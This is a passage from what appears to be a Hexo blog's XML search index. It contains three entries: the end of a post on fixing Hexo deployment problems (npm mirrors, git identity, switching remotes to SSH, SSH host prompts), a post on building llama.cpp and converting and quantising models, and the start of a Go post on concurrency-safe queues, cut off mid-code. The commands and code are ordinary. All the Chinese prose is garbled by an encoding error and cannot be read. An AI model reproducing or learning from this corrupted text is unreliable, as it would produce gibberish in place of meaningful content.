è®ºè¿™äº›åŒ…æ˜¯å…¨å±€å®‰è£…çš„è¿˜æ˜¯é¡¹ç›®æœ¬åœ°å®‰è£…çš„ï¼Œç¡®ä¿æ‚¨èƒ½å¤Ÿé¡ºåˆ©åœ°ä½¿ç”¨Hexoçš„å„é¡¹åŠŸèƒ½ã€‚</p><h4 id="2-ä¾èµ–å®‰è£…é€Ÿåº¦ç¼“æ…¢çš„é—®é¢˜"><a href="#2-ä¾èµ–å®‰è£…é€Ÿåº¦ç¼“æ…¢çš„é—®é¢˜" class="headerlink" title="2. ä¾èµ–å®‰è£…é€Ÿåº¦ç¼“æ…¢çš„é—®é¢˜"></a>2. ä¾èµ–å®‰è£…é€Ÿåº¦ç¼“æ…¢çš„é—®é¢˜</h4><p>åœ¨é¡¹ç›®åˆå§‹åŒ–é˜¶æ®µè¿è¡Œ <code>npm install</code> æ¥å®‰è£…é¡¹ç›®ä¾èµ–æ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°å®‰è£…é€Ÿåº¦éå¸¸æ…¢ï¼Œç”šè‡³å¡é¡¿çš„æƒ…å†µã€‚è¿™é€šå¸¸ä¸ç½‘ç»œç¯å¢ƒã€npmæ³¨å†Œè¡¨å“åº”é€Ÿåº¦æˆ–<code>node_modules</code>çš„ç¼“å­˜æœºåˆ¶æœ‰å…³ã€‚<br><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p><ul><li><strong>ä¼˜åŒ–é•œåƒæº</strong>ï¼šç¡®ä¿æ‚¨çš„é¡¹ç›®æˆ–å…¨å±€npmé…ç½®æŒ‡å‘ä¸€ä¸ªå¿«é€Ÿçš„é•œåƒæºï¼ˆä¾‹å¦‚ï¼Œåœ¨é¡¹ç›®æ ¹ç›®å½•çš„ <code>.npmrc</code> æ–‡ä»¶ä¸­é…ç½® <code>registry = https://registry.npmmirror.com</code>ï¼‰ã€‚</li><li><strong>åˆ‡æ¢åŒ…ç®¡ç†å™¨</strong>ï¼šå¦‚æœé¡¹ç›®å­˜åœ¨ <code>pnpm-lock.yaml</code> æ–‡ä»¶ï¼ˆè¡¨æ˜é¡¹ç›®å¯èƒ½æœŸæœ›ä½¿ç”¨ <code>pnpm</code>ï¼‰ï¼Œå¼ºçƒˆå»ºè®®åˆ‡æ¢åˆ° <code>pnpm install</code>ã€‚<code>pnpm</code> ä»¥å…¶ç‹¬ç‰¹çš„åŒ…ç®¡ç†æ–¹å¼ï¼Œé€šå¸¸èƒ½æä¾›æ›´å¿«çš„å®‰è£…é€Ÿåº¦å’Œæ›´é«˜æ•ˆçš„ç£ç›˜ç©ºé—´åˆ©ç”¨ã€‚</li></ul><h4 id="3-Gitæäº¤æ—¶èº«ä»½ä¿¡æ¯ç¼ºå¤±"><a href="#3-Gitæäº¤æ—¶èº«ä»½ä¿¡æ¯ç¼ºå¤±" class="headerlink" title="3. Gitæäº¤æ—¶èº«ä»½ä¿¡æ¯ç¼ºå¤±"></a>3. Gitæäº¤æ—¶èº«ä»½ä¿¡æ¯ç¼ºå¤±</h4><p>åœ¨å°è¯• <code>git commit</code> æ—¶ï¼Œå¦‚æœé‡åˆ°â€œAuthor identity unknownâ€çš„é”™è¯¯æç¤ºï¼Œè¿™æ„å‘³ç€Gitå®¢æˆ·ç«¯å°šæœªçŸ¥é“æ˜¯è°åœ¨è¿›è¡Œè¿™æ¬¡æäº¤ã€‚</p><p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šæ‚¨éœ€è¦åœ¨Gité…ç½®ä¸­è®¾ç½®æäº¤è€…çš„ç”¨æˆ·åç§°å’Œé‚®ç®±ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸ºå½“å‰é¡¹ç›®é…ç½®ï¼ˆæ¨èï¼‰æˆ–å…¨å±€é…ç½®ï¼š<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git config user.email <span class="string">&quot;ai@example.com&quot;</span></span><br><span class="line">git config user.name <span class="string">&quot;OpenClaw AI&quot;</span></span><br></pre></td></tr></table></figure><br>    è¯·æ ¹æ®å®é™…æƒ…å†µæ›¿æ¢é‚®ç®±å’Œåç§°ã€‚</p><h4 id="4-Gitæ¨é€æ—¶çš„å‡­è¯éªŒè¯é—®é¢˜"><a href="#4-Gitæ¨é€æ—¶çš„å‡­è¯éªŒè¯é—®é¢˜" class="headerlink" title="4. Gitæ¨é€æ—¶çš„å‡­è¯éªŒè¯é—®é¢˜"></a>4. Gitæ¨é€æ—¶çš„å‡­è¯éªŒè¯é—®é¢˜</h4><p>å½“æ‚¨è¿è¡Œ <code>git push</code> å‘½ä»¤æ—¶ï¼Œå¦‚æœ Git æç¤ºéœ€è¦ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè¿™é€šå¸¸å‘ç”Ÿåœ¨æ‚¨ä½¿ç”¨HTTPSæ–¹å¼å…‹éš†ä»“åº“ï¼Œå¹¶ä¸”å‡­è¯æœªè¢«ç¼“å­˜çš„æƒ…å†µä¸‹ã€‚AIé€šå¸¸æ— æ³•ç›´æ¥è¾“å…¥è¿™äº›å‡­è¯ã€‚</p><p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p><ul><li><p><strong>åˆ‡æ¢åˆ°SSHåè®®</strong>ï¼šå°†Gitè¿œç¨‹ä»“åº“çš„URLä»HTTPSæ ¼å¼ï¼ˆ<code>https://github.com/user/repo.git</code>ï¼‰ä¿®æ”¹ä¸ºSSHæ ¼å¼ï¼ˆ<code>git@github.com:user/repo.git</code>ï¼‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git remote set-url origin git@github.com:user/repo.git</span><br></pre></td></tr></table></figure><p>è¿™å…è®¸Gitä½¿ç”¨æ‚¨ç³»ç»Ÿä¸Šå·²é…ç½®çš„SSHå¯†é’¥è¿›è¡Œå…å¯†éªŒè¯ã€‚</p></li><li><p><strong>é…ç½®SSHå¯†é’¥</strong>ï¼šç¡®ä¿æ‚¨çš„å®¿ä¸»æœºå™¨å·²ç”Ÿæˆå¹¶é…ç½®äº†SSHå¯†é’¥ï¼Œå¹¶å°†å…¬é’¥æ·»åŠ åˆ°äº†æ‚¨çš„GitæœåŠ¡æä¾›å•†ï¼ˆå¦‚GitHubï¼‰çš„è´¦æˆ·è®¾ç½®ä¸­ã€‚</p></li></ul><h4 id="5-SSHä¸»æœºçœŸå®æ€§éªŒè¯æç¤º"><a href="#5-SSHä¸»æœºçœŸå®æ€§éªŒè¯æç¤º" class="headerlink" title="5. SSHä¸»æœºçœŸå®æ€§éªŒè¯æç¤º"></a>5. SSHä¸»æœºçœŸå®æ€§éªŒè¯æç¤º</h4><p>å½“æ‚¨é¦–æ¬¡é€šè¿‡SSHåè®®è¿æ¥åˆ°ä¸€ä¸ªæ–°çš„Gitå®¿ä¸»æ—¶ï¼Œå¯èƒ½ä¼šæ”¶åˆ°ä¸€ä¸ªå®‰å…¨æç¤ºï¼Œè¯¢é—®â€œAre you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])?â€ï¼Œè¦æ±‚æ‚¨éªŒè¯ä¸»æœºçš„çœŸå®æ€§ã€‚</p><p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå¿…è¦çš„å®‰å…¨æ­¥éª¤ã€‚æ‚¨éœ€è¦åœ¨å®¿ä¸»æœºå™¨çš„ç»ˆç«¯ä¸­ï¼Œæ‰‹åŠ¨å¯¹è¯¥æç¤ºè¾“å…¥ <code>yes</code> å¹¶å›è½¦ã€‚è¿™å°†æŠŠè¯¥Gitå®¿ä¸»çš„å…¬é’¥æŒ‡çº¹æ·»åŠ åˆ°æ‚¨ç³»ç»Ÿä¸Šçš„ <code>~/.ssh/known_hosts</code> æ–‡ä»¶ä¸­ï¼Œç¡®ä¿åç»­çš„SSHè¿æ¥èƒ½å¤Ÿç›´æ¥è¢«ä¿¡ä»»ã€‚</p><p>é¢„é›†æˆè¿™äº›ç»éªŒï¼Œå¸Œæœ›èƒ½è®©æ‚¨æœªæ¥çš„Hexoåšå®¢ç®¡ç†å’Œå‘å¸ƒå·¥ä½œæ›´åŠ ä¾¿æ·é«˜æ•ˆã€‚</p><p><strong>ç»“è¯­</strong></p><p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œæ‚¨å¯ä»¥é«˜æ•ˆåœ°åœ¨Hexoåšå®¢ä¸­æ’°å†™ã€é¢„è§ˆå¹¶å‘å¸ƒæ–°çš„æ–‡ç« ã€‚ä¸“æ³¨äºé«˜è´¨é‡çš„å†…å®¹åˆ›ä½œï¼Œè€ŒæŠ€æœ¯ç»†èŠ‚å°†ç”±Hexoå’Œæ‚¨çš„è‡ªåŠ¨åŒ–éƒ¨ç½²æµç¨‹è½»æ¾å¤„ç†ã€‚ç¥æ‚¨å†™ä½œæ„‰å¿«ï¼</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯åˆ†äº« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenClaw AI </tag>
            
            <tag> Hexo </tag>
            
            <tag> åšå®¢å®è·µ </tag>
            
            <tag> éƒ¨ç½²æŒ‡å— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨llama.cppæ¨ç†å¤§æ¨¡å‹</title>
      <link href="/post/use-llama-cpp.html"/>
      <url>/post/use-llama-cpp.html</url>
      
        <content type="html"><![CDATA[<h2 id="llama-cpp"><a href="#llama-cpp" class="headerlink" title="llama.cpp"></a>llama.cpp</h2><p>å¤§æ¨¡å‹æœ‰è®­ç»ƒå’Œæ¨ç†ä¸¤éƒ¨åˆ†ï¼Œè®­ç»ƒä¼šäº§ç”Ÿä¸€ä¸ªå¤§æ¨¡å‹æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶é€šå¸¸åŒ…å«äº†æ¨¡å‹æ¶æ„ä»¥åŠæ¯ä¸ªç¥ç»å…ƒçš„æƒé‡å’Œåç½®å€¼ã€‚<a href="https://github.com/ggerganov/llama.cpp">llama.cpp</a>ä¸»è¦ç”¨åœ¨æ¨ç†éƒ¨åˆ†ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ˜¯ä¸€ä¸ªä½¿ç”¨<code>c++</code>å¼€å‘çš„å¤§æ¨¡å‹æ¨ç†æ¡†æ¶ã€‚å®ƒå¯ä»¥åœ¨æ™®é€šå®¶ç”¨ç”µè„‘ä¸Šå®Œæˆæ¨ç†ï¼Œåªéœ€è¦CPUå’Œå‡ ä¸ªGçš„å†…å­˜å°±èƒ½è¿è¡Œã€‚</p><h3 id="ç¼–è¯‘å®‰è£…"><a href="#ç¼–è¯‘å®‰è£…" class="headerlink" title="ç¼–è¯‘å®‰è£…"></a>ç¼–è¯‘å®‰è£…</h3><blockquote><p>å‚è€ƒ <a href="https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#build">https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#build</a></p></blockquote><ol><li><p>æ‹‰å–ä»£ç </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ggerganov/llama.cpp.git</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘</p><blockquote><p>å¯¹äºé<code>Apple Silicon</code>ç³»åˆ—èŠ¯ç‰‡æ¨ç†æ—¶å¦‚æœæœ‰é—®é¢˜å¯ä»¥åœ¨ç¼–è¯‘æ—¶ç¦ç”¨<code>GPU</code>ã€‚ç¼–è¯‘æ—¶ä½¿ç”¨<code>LLAMA_NO_METAL=1</code>æˆ–è€…<code>LLAMA_METAL=OFF</code>å‚æ•°ã€‚<a href="https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#metal-build">https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#metal-build</a></p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure></li></ol><p>ç¼–è¯‘å®Œæˆä¼šå‚æ•°<code>mian</code>å’Œ<code>quantize</code>æ–‡ä»¶ï¼Œå‰è€…ç”¨æ¥è¿è¡Œå¤§æ¨¡å‹æ¨ç†ï¼Œåè€…ç”¨æ¥æ¨¡å‹å‘é‡åŒ–å¤„ç†ã€‚</p><h3 id="æ¨¡å‹è½¬æ¢"><a href="#æ¨¡å‹è½¬æ¢" class="headerlink" title="æ¨¡å‹è½¬æ¢"></a>æ¨¡å‹è½¬æ¢</h3><p>ä¸€èˆ¬å¤§æ¨¡å‹æ–‡ä»¶éƒ½æ‰˜ç®¡åœ¨<a href="https://huggingface.co/">Hugging Face</a>ä¸Šé¢ã€‚ä¸€èˆ¬æƒ…å†µä¸‹<code>llama.cpp</code>ä¸èƒ½ç›´æ¥ä½¿ç”¨è¿™äº›å¤§æ¨¡å‹è¿›è¡Œæ¨ç†ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå¯¹è¿™äº›æ¨¡å‹è¿›è¡Œè½¬æ¢ï¼Œè½¬ä¸º<code>ggml</code>æ ¼å¼ã€‚æ”¯æŒè½¬æ¢çš„å¤§æ¨¡å‹åˆ—è¡¨å‚è€ƒå®˜æ–¹<a href="https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#description">README</a>å›½äº§å¤§æ¨¡å‹ç™¾å·ã€åƒé—®ç­‰éƒ½æ”¯æŒè½¬ä¸º<code>ggml</code>æ ¼å¼ã€‚</p><p>è½¬æ¢ä½¿ç”¨<code>llama.cpp</code>é¡¹ç›®å†…çš„<code>convert.py</code>æˆ–è€…<code>convert-hf-to-gguf.py</code>å¤„ç†ï¼Œè¯¦ç»†æ­¥éª¤å‚è€ƒ <a href="https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#prepare-data--run">https://github.com/ggerganov/llama.cpp?tab=readme-ov-file#prepare-data--run</a>ã€‚è¿™é‡Œå¯¹Pythonç‰ˆæœ¬æœ‰ä¸€å®šçš„è¦æ±‚ï¼Œæ¨¡å—çš„ä¾èµ–åœ¨<code>requirements.txt</code>å’Œ<code>requirements</code>ç›®å½•ä¸‹ã€‚</p><p>ä¸€èˆ¬æƒ…å†µå…ˆä½¿ç”¨<code>convert.py</code>è½¬æ¢ï¼Œå¦‚æœè½¬æ¢å¤±è´¥åœ¨ä½¿ç”¨<code>convert-hf-to-gguf.py</code>å°è¯•å¤„ç†ã€‚æ³¨æ„ï¼Œä½¿ç”¨<code>convert-hf-to-gguf.py</code>æ—¶éœ€è¦æˆ‘ä»¬å®‰è£…é¢å¤–çš„ä¾èµ–ï¼Œä¾èµ–åˆ—è¡¨åœ¨<code>requirements/requirements-convert-hf-to-gguf.txt</code>ã€‚</p><p>è½¬æ¢åçš„æ¨¡å‹æˆ‘ä»¬éœ€è¦è¿›è¡Œå‘é‡åŒ–ï¼Œä½¿ç”¨<code>./quantize</code>å¯¹è½¬æ¢åçš„æ¨¡å‹è¿›è¡Œå‘é‡åŒ–ã€‚å‘é‡åŒ–åçš„æ¨¡å‹å°±å¯ä»¥è¿›è¡Œæ¨ç†äº†ã€‚</p><h3 id="å’Œllama-cppç±»ä¼¼çš„å·¥å…·"><a href="#å’Œllama-cppç±»ä¼¼çš„å·¥å…·" class="headerlink" title="å’Œllama.cppç±»ä¼¼çš„å·¥å…·"></a>å’Œllama.cppç±»ä¼¼çš„å·¥å…·</h3><ul><li><p><a href="https://github.com/li-plus/chatglm.cpp">chatglm.cpp</a></p><p>  ä¸€ä¸ªç”¨äº<a href="https://github.com/THUDM/ChatGLM3">ChatGLM</a>å¤§æ¨¡å‹æ¨ç†æ¡†æ¶</p></li><li><p><a href="https://github.com/SJTU-IPADS/PowerInfer">PowerInfer</a></p><ul><li>ä¸€ä¸ªå¯ä»¥åœ¨æ¶ˆè´¹çº§GPUè¿è¡Œçš„å¤§æ¨¡å‹æ¨ç†æ¡†æ¶</li></ul></li></ul><h3 id="Hugging-Face-é•œåƒ"><a href="#Hugging-Face-é•œåƒ" class="headerlink" title="Hugging Face é•œåƒ"></a>Hugging Face é•œåƒ</h3><ul><li><p><a href="https://www.modelscope.cn/models">modelscope</a></p><p>  å¯ä»¥ç›´æ¥ä½¿ç”¨<code>git clone</code>æ‹‰å–å¤§æ¨¡å‹ã€‚æ³¨æ„ï¼Œéœ€è¦å®‰è£…<a href="https://git-lfs.com/">LFS</a></p></li><li><p><a href="https://hf-mirror.com/">hf-mirror</a></p><p>  é…ç½®é•œåƒåå¯ä»¥ä½¿ç”¨<code>huggingface</code>å®˜æ–¹å‘½ä»¤è¡Œ<code>huggingface-cli</code>å·¥å…·ä¸‹è½½æ¨¡å‹æ–‡ä»¶</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HF_ENDPOINT=https://hf-mirror.com</span><br></pre></td></tr></table></figure></li></ul><h3 id="åè¯è§£é‡Š"><a href="#åè¯è§£é‡Š" class="headerlink" title="åè¯è§£é‡Š"></a>åè¯è§£é‡Š</h3><ul><li><p>B<br>  å¤§æ¨¡å‹æƒé‡å‚æ•°å•ä½ï¼Œ1Bè¡¨ç¤ºåäº¿ã€‚ä¾‹å¦‚æœ‰<code>7B</code>ã€<code>14B</code>è¡¨ç¤ºå‚æ•°æœ‰70äº¿å’Œ140äº¿ï¼Œå‚æ•°è¶Šå¤§æ¨ç†æ—¶è€—è´¹çš„èµ„æºè¶Šå¤š</p></li><li><p>FP16ã€int8ã€int4</p><p>  FP16ã€int8ã€int4 ç­‰é€šå¸¸æŒ‡çš„æ˜¯æ¨¡å‹æƒé‡ã€æ¿€æ´»å€¼æˆ–æ¢¯åº¦çš„æ•°å€¼è¡¨ç¤ºæ–¹å¼ï¼Œè¡¨ç¤ºæ•°å€¼ç²¾åº¦ã€‚</p><p>  FP16 æŒ‡çš„æ˜¯ 16 ä½æµ®ç‚¹æ•°ï¼ˆå³åŠç²¾åº¦æµ®ç‚¹æ•°ï¼‰ï¼Œæ¯ä¸ªæ•°å€¼å ç”¨ 2 å­—èŠ‚ã€‚</p><p>  int8 æŒ‡çš„æ˜¯ 8 ä½æ•´æ•°ï¼Œæ¯ä¸ªæ•°å€¼å ç”¨ 1 å­—èŠ‚ã€‚</p><p>  1Bçš„FP16ç²¾åº¦çš„å¤§æ¨¡å‹ä¸º<code>1000,000,000</code> * 2Byte â‰ˆ 2GBï¼Œ1Bçš„int8ç²¾åº¦çš„å¤§æ¨¡å‹ä¸º<code>1000,000,000</code> * 1Byte â‰ˆ 1GB</p></li><li><p>Quantization (é‡åŒ–)</p><p>  <code>é‡åŒ–</code> æ˜¯ä¸€ç§é€šè¿‡é™ä½æ•°å€¼è¡¨ç¤ºç²¾åº¦ï¼ˆå¦‚å°† FP32 é™ä¸º int8ï¼‰çš„æŠ€æœ¯ï¼Œä»¥å‡å°‘å†…å­˜å’Œè®¡ç®—èµ„æºçš„æ¶ˆè€—ã€‚</p><p>  é‡åŒ–åçš„æ¨¡å‹å¯ä»¥åœ¨å†…å­˜å ç”¨å’Œè®¡ç®—å¤æ‚åº¦æ–¹é¢æ›´é«˜æ•ˆï¼Œå°¤å…¶æ˜¯åœ¨æ¨ç†é˜¶æ®µæ˜¾è‘—æé«˜é€Ÿåº¦ã€‚</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Golangçš„å¹¶å‘å®‰å…¨</title>
      <link href="/post/go-sync.html"/>
      <url>/post/go-sync.html</url>
      
        <content type="html"><![CDATA[<h2 id="Golangçš„å¹¶å‘å®‰å…¨"><a href="#Golangçš„å¹¶å‘å®‰å…¨" class="headerlink" title="Golangçš„å¹¶å‘å®‰å…¨"></a>Golangçš„å¹¶å‘å®‰å…¨</h2><p>åœ¨æœ‰å¤šä¸ª<code>goroutines</code>åŒæ—¶è®¿é—®å¹¶ä¸”è‡³å°‘æœ‰ä¸€ä¸ª<code>goroutines</code>åœ¨ä¿®æ”¹æ•°æ®çš„æƒ…å†µä¸‹å°±ä¼šå­˜åœ¨å¹¶å‘é—®é¢˜ã€‚Golangå¤„ç†å¹¶å‘å®‰å…¨æœ‰é”å’Œ<code>channel</code>ä¸¤ç§æ–¹æ¡ˆï¼Œå‰è€…é€šè¿‡åŠ é”æ–¹å¼ä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªæ“ä½œåœ¨è®¿é—®æ•°æ®ï¼Œåè€…æ˜¯å°†æ“ä½œä¸²è¡ŒåŒ–æ¥æ¥å®ç°åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªæ“ä½œè®¿é—®æ•°æ®ã€‚è¿™ä¸¤ç§æ–¹æ³•éƒ½æ˜¯åœ¨é€šè¿‡çº¦æŸå¹¶å‘è®¿é—®&#x2F;ä¿®æ”¹æ•°æ®æ¥è§£å†³å¹¶å‘å®‰å…¨é—®é¢˜ã€‚</p><p>åœ¨<code>Golang</code>å®˜ç½‘æœ‰ä¸€æ®µå…³äºå¹¶å‘å®‰å…¨çš„å»ºè®®ï¼š</p><blockquote><p><a href="https://golang.org/ref/mem#tmp_1">Advice</a></p><p>Programs that modify data being simultaneously accessed by multiple goroutines must serialize such access.<br>To serialize access, protect the data with channel operations or other synchronization primitives such as those in the sync and sync&#x2F;atomic packages.<br>If you must read the rest of this document to understand the behavior of your program, you are being too clever.<br>Donâ€™t be clever.</p></blockquote><p>ä¸‹é¢æˆ‘å°†ä»å®ç°ä¸€ä¸ªå¹¶å‘å®‰å…¨çš„é˜Ÿåˆ—æ¥ä»‹ç»<code>Golang</code>é‡Œé¢çš„å¹¶å‘å·¥å…·ã€‚</p><h3 id="å¹¶å‘å®‰å…¨çš„é˜Ÿåˆ—"><a href="#å¹¶å‘å®‰å…¨çš„é˜Ÿåˆ—" class="headerlink" title="å¹¶å‘å®‰å…¨çš„é˜Ÿåˆ—"></a>å¹¶å‘å®‰å…¨çš„é˜Ÿåˆ—</h3><p>ä¸€ä¸ªç®€å•çš„é˜Ÿåˆ—æœ€å°‘æœ‰<code>Add</code>å’Œ<code>Pop</code>ä¸¤ä¸ªæ“ä½œï¼Œé˜Ÿåˆ—å†…éƒ¨ä¸€èˆ¬é€šè¿‡åˆ—è¡¨æˆ–è€…é“¾è¡¨æ¥å­˜æ”¾æ•°æ®ã€‚è¿™ä¸¤ä¸ªæ“ä½œéƒ½æ˜¯å¯¹åº•å±‚çš„åˆ—è¡¨æˆ–è€…é“¾è¡¨çš„å†™æ“ä½œã€‚åº•å±‚çš„åˆ—è¡¨å’Œé“¾è¡¨å¹¶ä¸æ˜¯å¹¶å‘å®‰å…¨çš„ï¼Œåœ¨å¤šä¸ª<code>goroutines</code>åœ¨åŒæ—¶<code>Add</code>æˆ–<code>Pop</code>æ—¶å°±ä¼šæœ‰å¹¶å‘é—®é¢˜ã€‚</p><p>è¦å®ç°ä¸€ä¸ªå¹¶å‘å®‰å…¨çš„é˜Ÿåˆ—ï¼Œå°±è¦åœ¨<code>Add</code>å’Œ<code>Pop</code>æ“ä½œåŠ é”ï¼š</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Queue <span class="keyword">struct</span> &#123;</span><br><span class="line">    elements []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">    lock *sync.Mutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Pop() (ele <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">    q.lock.Lock()</span><br><span class="line">    <span class="keyword">defer</span> q.lock.Unlock()</span><br><span class="line"></span><br><span class="line">    ele = q.elements[q.Size()<span class="number">-1</span>]</span><br><span class="line">    q.elements = q.elements[:q.Size()<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Add(ele <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">    q.lock.Lock()</span><br><span class="line">    <span class="keyword">defer</span> q.lock.Unlock()</span><br><span class="line"></span><br><span class="line">    q.elements = <span class="built_in">append</span>(q.elements, ele)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒè™‘åˆ°ç°å®çš„æƒ…å†µï¼Œæˆ‘ä»¬é˜Ÿåˆ—çš„å®¹é‡ä¸èƒ½æ˜¯æ²¡æœ‰é™åˆ¶çš„ï¼Œè¿™ä¼šæœ‰å†…å­˜æ–¹é¢çš„é—®é¢˜ï¼Œæˆ‘ä»¬è¦é™åˆ¶é˜Ÿåˆ—çš„å®¹é‡ã€‚é˜Ÿåˆ—ç©ºçš„æ—¶å€™<code>Pop</code>æ—¶æˆ‘ä»¬è¦é˜»å¡ç›´åˆ°æœ‰å€¼ï¼Œé˜Ÿåˆ—æ»¡æ—¶æˆ‘ä»¬<code>Add</code>è¦é˜»å¡åˆ°é˜Ÿåˆ—ä¸æ»¡ï¼Œè¿™ç§æƒ…å†µå°±éœ€è¦<code>sync.Cond</code>æ¥é˜»å¡ã€‚å®ƒå’ŒJavaä¸­çš„<code>å†…ç½®æ¡ä»¶é˜Ÿåˆ—</code>ç±»ä¼¼ï¼Œå¯ä»¥ä½¿å½“å‰<code>goroutine</code>åœ¨æŸä¸ªçŠ¶æ€ä¸Šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°è¿™ä¸ªçŠ¶æ€è¢«æ¿€æ´»ã€‚</p><table><thead><tr><th>Java</th><th>Golang</th></tr></thead><tbody><tr><td>wait</td><td>Wait</td></tr><tr><td>notify</td><td>Signal</td></tr><tr><td>notifyAll</td><td>Broadcast</td></tr></tbody></table><p>æˆ‘ä»¬éœ€è¦ä¸¤ä¸ª<code>sync.Cond</code>æ¡ä»¶æ¥åˆ†åˆ«è¡¨ç¤ºé˜Ÿåˆ—ä¸ºç©ºå’Œé˜Ÿåˆ—æ»¡ä¸¤ç§çŠ¶æ€ï¼Œè¿™ä¸¤ä¸ª<code>sync.Cond</code>å†…éƒ¨è¦ä½¿ç”¨åŒä¸€æŠŠé”ç”¨åœ¨æ“ä½œ<code>Add</code>å’Œ<code>Pop</code>æ¥é¿å…å¹¶å‘é—®é¢˜ã€‚</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> Queue <span class="keyword">struct</span> &#123;</span><br><span class="line">    elements []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">    capacity <span class="type">int</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é˜Ÿåˆ—æœªç©ºæ¡ä»¶é˜Ÿåˆ—</span></span><br><span class="line">    notEmptyCond *sync.Cond</span><br><span class="line">    <span class="comment">// é˜Ÿåˆ—æœªæ»¡æ¡ä»¶é˜Ÿåˆ—</span></span><br><span class="line">    notFullCond *sync.Cond</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> Size() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(q.elements)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span></span> isFull() <span class="type">bool</span> &#123;</span><br><span class="line">    